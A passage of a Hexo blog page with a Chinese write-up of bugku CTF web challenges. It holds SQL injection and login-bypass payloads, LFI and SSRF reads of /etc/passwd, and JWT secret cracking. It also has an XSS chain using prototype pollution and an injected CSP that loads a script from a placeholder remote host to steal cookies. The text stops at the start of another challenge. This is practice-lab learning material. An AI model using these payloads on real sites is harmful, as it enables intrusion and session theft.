@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="bugku-web 部分wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bugku">
+<meta property="og:url" content="http://example.com/2023/10/01/web%E5%AE%89%E5%85%A8/ctf/bugku/index.html">
+<meta property="og:site_name" content="Sean&#39;s Blog">
+<meta property="og:description" content="bugku-web 部分wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001203049302.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001203223294.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001203636709.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001204044904.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001213531967.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001214004594.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001221455182.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231003195957991.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231003230352799.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006154726518.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006155320880.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006170834819.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006222026006.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006222928174.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006232040277.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006232252821.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007153027631.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007153312177.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007154138394.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007155527098.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007161840579.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007180733118.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007174242405.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009133458515.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009133649987.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009141512914.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009145104978.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009231121091.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009233115828.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009233621488.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231010134320326.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231010135736236.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231010145039155.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231010193537849.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231010194020260.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231010194355866.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011125719290.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011140113420.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011141153913.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011153458941.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011153857267.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011155325508.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231011161430725.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231012125931315.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231012142617510.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231012153029276.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231012174354027.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231012222149094.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231012233626884.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014174011309.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014173356110.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014173520220.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014191932477.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014192422272.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014201151850.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014224934973.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231014230533897.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231015220753981.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231017184335557.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231017184733809.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231017211728892.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231017222549672.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231017222613249.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231018132357505.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231018132753708.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231018150920359.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231018151156773.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231019222813718.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231019223449964.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231019230431176.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231019234913680.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231019234704766.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020134940106.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020140846860.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020141420410.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020141834233.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020142031106.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020204445245.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020211336154.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020212919360.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020213825145.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020213917933.png">
+<meta property="article:published_time" content="2023-10-01T12:13:41.000Z">
+<meta property="article:modified_time" content="2024-05-27T08:04:38.351Z">
+<meta property="article:author" content="Sean">
+<meta property="article:tag" content="网络安全 课程笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001203049302.png">
+
+<link rel="canonical" href="http://example.com/2023/10/01/web%E5%AE%89%E5%85%A8/ctf/bugku/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>bugku | Sean's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sean's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/01/web%E5%AE%89%E5%85%A8/ctf/bugku/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/banner.jpg">
+      <meta itemprop="name" content="Sean">
+      <meta itemprop="description" content="热爱可抵岁月漫长">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sean's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          bugku
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-01 20:13:41" itemprop="dateCreated datePublished" datetime="2023-10-01T20:13:41+08:00">2023-10-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-05-27 16:04:38" itemprop="dateModified" datetime="2024-05-27T16:04:38+08:00">2024-05-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>bugku-web 部分wp</p>
+<span id="more"></span>
+
+<h1 id="202310"><a href="#202310" class="headerlink" title="202310"></a>202310</h1><h2 id="01"><a href="#01" class="headerlink" title="01"></a>01</h2><p>应该是很简单的，希望能不看wp刷完</p>
+<h3 id="inspect-me"><a href="#inspect-me" class="headerlink" title="inspect-me"></a>inspect-me</h3><p>F12查看页面源码，flag在注释中。</p>
+<h3 id="my-first-sqli"><a href="#my-first-sqli" class="headerlink" title="my-first-sqli"></a>my-first-sqli</h3><p>单引号报错→存在sql注入，单引号闭合，数据库sqlite3</p>
+<p>使用order by判断列数：2列</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001203049302.png" alt="image-20231001203049302"></p>
+<p>尝试union联合注入看看回显情况：直接拿到flag了，0分题真好</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001203223294.png" alt="image-20231001203223294"></p>
+<h3 id="post-the-get"><a href="#post-the-get" class="headerlink" title="post-the-get"></a>post-the-get</h3><p>post按钮无法点击，查看源码，将disabled属性删掉。</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001203636709.png" alt="image-20231001203636709"></p>
+<p>抓包，是get请求，按照题目要求应该是要改成post。有几个方法：</p>
+<ol>
+<li>修改form表单的method属性为post</li>
+<li>在burp-repeater-右键change request method</li>
+<li>根据get和post的区别手动修改（method、参数位置、content-type</li>
+</ol>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001204044904.png" alt="image-20231001204044904"></p>
+<h3 id="sqli-0x1"><a href="#sqli-0x1" class="headerlink" title="sqli-0x1"></a>sqli-0x1</h3><p>前端页面源码中提示：&#x2F;?pls_help。源码审计啊</p>
+<ol>
+<li>黑名单过滤了一些特殊符号，尤其是单引号</li>
+<li>sql查询直接单引号拼接</li>
+<li>登录成功能获得flag（用户名admin</li>
+</ol>
+<p>由于select时没有直接判断password，不能利用转义法。</p>
+<p><strong>重点不在username，在于构造password以绕过后面的密码判断。</strong></p>
+<p>绕过is_trying_to_hak_me判断：username满足<code>preg_match(&quot;/[0-9a-zA-Z]&#39;[0-9a-zA-Z]/&quot;, $str)</code>且单引号周围没有空格，用<code>/**/</code>内联注释代替空格</p>
+<p>利用联合注入控制select的返回结果，第二个位置为自定义的password</p>
+<p>构造password：自定义一个密码1和盐值1，用sha256加密</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha256&quot;</span>,<span class="string">&quot;1&quot;</span>.<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="comment">//4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8$1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001213531967.png" alt="image-20231001213531967"></p>
+<p>总结：逻辑漏洞</p>
+<h3 id="baby-lfi"><a href="#baby-lfi" class="headerlink" title="baby lfi"></a>baby lfi</h3><p>看起来是文件包含，参数为language，提示包含&#x2F;etc&#x2F;passwd文件。</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001214004594.png" alt="image-20231001214004594"></p>
+<h3 id="baby-lfi-2"><a href="#baby-lfi-2" class="headerlink" title="baby lfi 2"></a>baby lfi 2</h3><p>提示存在languages目录？</p>
+<p>一直是illegal path specified，只支持languages目录下的内容？目录遍历也不行，php伪协议也不行</p>
+<p>御剑扫到了en.php和fr.php</p>
+<p><strong>必须是以languages目录开头才不会报illegal，emmm</strong></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231001221455182.png" alt="image-20231001221455182"></p>
+<h2 id="02-06"><a href="#02-06" class="headerlink" title="02-06"></a>02-06</h2><h3 id="challenge-creator"><a href="#challenge-creator" class="headerlink" title="*challenge-creator"></a>*challenge-creator</h3><p>看到一堆csp时，猜测是xss相关。nonce值会改变</p>
+<p>审计前端js代码：</p>
+<ol>
+<li>点击创建challenge出的submitChallenge方法，根据表单内容构造跳转的url（json转字符串</li>
+<li>parseChallenge<ol>
+<li>根据challenge参数解析为JSON对象</li>
+<li>对JSON对象的每个键值对进行判断以及赋值</li>
+</ol>
+</li>
+</ol>
+<p>参考：<a target="_blank" rel="noopener" href="https://team0se7en.github.io/hackini-10th-challenge-creator/">https://team0se7en.github.io/hackini-10th-challenge-creator/</a></p>
+<p><strong>注入点在head部分，请求后会将name值回显到title标签内，由于title标签内不能解析html语句，因此需要先闭合。</strong>name值为<code>&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;title&gt;</code>，有过滤</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231003195957991.png" alt="image-20231003195957991"></p>
+<p>看到JSON.parse意识到可能有JS原型链污染，测了好久没测出来，但是还真有。<strong>通过插入CSP来控制浏览器不执行第二个script脚本，使challenge变量可控（后面parseChallenge方法中Object.entries遍历时用到了challenge变量），再通过输出时新建的元素进行xss</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">outputChallenge</span>(<span class="params">chal</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> el = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(jsonCodeOutput.<span class="property">tag</span>);<span class="comment">//可以控制创建的元素的类型，改为script标签</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> [attribute, val] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(jsonCodeOutput.<span class="property">attributes</span>)) &#123;</span><br><span class="line">        el.<span class="title function_">setAttribute</span>(attribute, val);	<span class="comment">//可以控制创建的元素的属性，如src</span></span><br><span class="line">    &#125;</span><br><span class="line">    jsonOutput.<span class="title function_">appendChild</span>(el);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseChallenge</span>(<span class="params"></span>) &#123;</span><br><span class="line">    chal = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>).<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&quot;challenge&quot;</span>))<span class="comment">//challenge为第一个script执行的结果，由URL参数决定，有__proto__键</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> [key, defaultValue] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(challenge)) &#123;</span><br><span class="line">        value = chal[key];</span><br><span class="line">        assignedVal = value || defaultValue;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> assignedVal === <span class="string">&quot;object&quot;</span> &amp;&amp; <span class="keyword">typeof</span> defaultValue === <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">const</span> [subKey, subDefaultValue] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(defaultValue)) &#123;</span><br><span class="line">                <span class="keyword">let</span> subValue = chal[key] !== <span class="literal">undefined</span> ? chal[key][subKey] : subDefaultValue;</span><br><span class="line">                parsedChal[key][subKey] = subValue;<span class="comment">//污染原型链：parseChal.__proto__.attributes=...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            parsedChal[key] = assignedVal;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">outputChallenge</span>(parsedChal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造URL，建立新的csp规则，允许任意src的script执行（记得URL编码后再执行）</p>
+<ol>
+<li><code>script-src *</code>：允许从任何来源加载脚本。</li>
+<li>两个sha256值是第一个和第三个script脚本的hash值，<a target="_blank" rel="noopener" href="https://csplite.com/csp/sha/">https://csplite.com/csp/sha/</a></li>
+<li>attributes.src为远端服务器存放js脚本的地址（不直接写在页面中是因为会报错，Content-Security-Policy：忽略 script-src 中的 “’unsafe-inline’”：指定了 nonce-source 或 hash-source）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;: &quot;&lt;/title&gt; &lt;meta http-equiv=&#x27;Content-Security-Policy&#x27; content=\&quot;script-src * &#x27;sha256-eyVKju/vSji+klXiXwhgD7spFJI0/Kk10K2eq4a9NCU=&#x27; &#x27;sha256-8+tX0RdD8rNbWDDLNb3z8ixoi28g7G5On2AwCBePR0Y=&#x27; \&quot;&gt;&lt;title&gt;&quot;,&quot;category&quot;: &quot;asd&quot;,&quot;value&quot;: &quot;1337&quot;,&quot;__proto__&quot;: &#123;&quot;tag&quot;: &quot;script&quot;,&quot;attributes&quot;: &#123;&quot;src&quot;: &quot;http://xxxxxx/xxx.js&quot;,&quot;id&quot;: &quot;hack&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231003230352799.png" alt="image-20231003230352799"></p>
+<p>怎么获取flag？？？？很神奇，就是document.cookie，但是要用这种方式才能带出来？？是域名的问题吗？？</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Shellmates/HackINI-2k22-CTF-challs">https://github.com/Shellmates/HackINI-2k22-CTF-challs</a></p>
+<p>总结：js原型链污染、csp hash控制脚本白名单</p>
+<h2 id="06"><a href="#06" class="headerlink" title="06"></a>06</h2><h3 id="nextGen1"><a href="#nextGen1" class="headerlink" title="nextGen1"></a>nextGen1</h3><p>Overview中两个选项会发起POST请求，点点点然后抓包可以看到，或者直接看main.js：</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006154726518.png" alt="image-20231006154726518"></p>
+<p>将service参数改为<code>file:///etc/passwd</code>，可以读取服务器本地文件。查看flag：<code>file:///flag.txt</code></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006155320880.png" alt="image-20231006155320880"></p>
+<h3 id="web1"><a href="#web1" class="headerlink" title="*web1"></a>*web1</h3><p>目录扫描，找到网站源码<a target="_blank" rel="noopener" href="http://www.zip,存在config.php但是不可访问,压缩包里也没有./">www.zip，存在config.php但是不可访问，压缩包里也没有。</a></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006170834819.png" alt="image-20231006170834819"></p>
+<p>代码审计：</p>
+<ol>
+<li>login.php<ol>
+<li>参数化查询，不容易注入</li>
+<li>users表，password为md5值，存在is_admin判断身份</li>
+</ol>
+</li>
+<li>register.php<ol>
+<li>检测各个参数的长度，防止二次注入？</li>
+<li>检测邮件是否合法，后面重置密码要发送邮件验证</li>
+<li>参数化insert，默认is_admin为0，猜测为1是admin</li>
+</ol>
+</li>
+<li>handler.php 重置密码<ol>
+<li>根据用户名查询邮箱，发送随机生成的6位数验证码（可以爆破？），email.php不可访问</li>
+<li>参数化update</li>
+</ol>
+</li>
+</ol>
+<p>经测试填写正确的邮箱地址也会在send email时报错，所以这一块有漏洞。可能是环境有问题……</p>
+<p>爆破随机种子，mt_srand，mt_rand</p>
+<h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>页面源码中（扫了半天后台……</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006222026006.png" alt="image-20231006222026006"></p>
+<h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><p>注册登录，响应头中存在提示：flag是admin的密码</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006222928174.png" alt="image-20231006222928174"></p>
+<p>看到werkzeug想到ssti，no</p>
+<p>jwt爆破密钥，<a target="_blank" rel="noopener" href="https://github.com/alexrsagen/go-jwt-cracker/releases/%EF%BC%8C%E4%B8%BA%E5%95%A5%E7%8C%9C%E5%88%B0%E6%98%AF4%E4%BD%8D%E7%9A%84%EF%BC%9F%EF%BC%9F%EF%BC%9F%60NuAa%60">https://github.com/alexrsagen/go-jwt-cracker/releases/，为啥猜到是4位的？？？`NuAa`</a></p>
+<p>根据密钥构造admin的jwt值：</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006232040277.png" alt="image-20231006232040277"></p>
+<p>抓包&#x2F;panel请求，修改jwt得到flag：</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231006232252821.png" alt="image-20231006232252821"></p>
+<p>总结：jwt-secret爆破</p>
+<p>今日感想：有些可能环境本身就有问题，遇事不决果断看wp</p>
+<h2 id="07"><a href="#07" class="headerlink" title="07"></a>07</h2><h3 id="easy-pop"><a href="#easy-pop" class="headerlink" title="easy-pop"></a>easy-pop</h3><p>代码审计</p>
